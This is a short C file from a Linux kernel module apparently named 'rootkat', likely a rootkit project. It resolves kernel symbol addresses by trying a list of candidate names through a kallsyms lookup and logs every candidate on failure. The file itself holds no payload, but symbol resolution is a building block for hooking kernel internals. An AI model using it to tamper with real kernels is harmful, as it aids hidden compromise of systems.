// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include "resolver.h"
#include "kallsyms.h"

#define TAG "rootkat/resolver: "

unsigned long rootkat_resolve(const char * const *candidates,
                              const char **matched)
{
	const char * const *c;
	unsigned long addr;

	/* Defend against zero-init struct fields and other caller mishaps. */
	if (!candidates || !*candidates) {
		pr_debug(TAG "called with %s candidate list\n",
		        candidates ? "empty" : "NULL");
		return 0;
	}

	for (c = candidates; *c; c++) {
		addr = rootkat_lookup_name(*c);
		if (addr) {
			pr_debug(TAG "resolved '%s' -> %lx\n", *c, addr);
			if (matched)
				*matched = *c;
			return addr;
		}
	}

	/* On miss, log ALL candidates so the failure can be diagnosed
	 * against /proc/kallsyms without having to read the call site. */
	pr_debug(TAG "no candidate resolved; tried:\n");
	for (c = candidates; *c; c++)
		pr_debug(TAG "  - '%s'\n", *c);
	return 0;
}
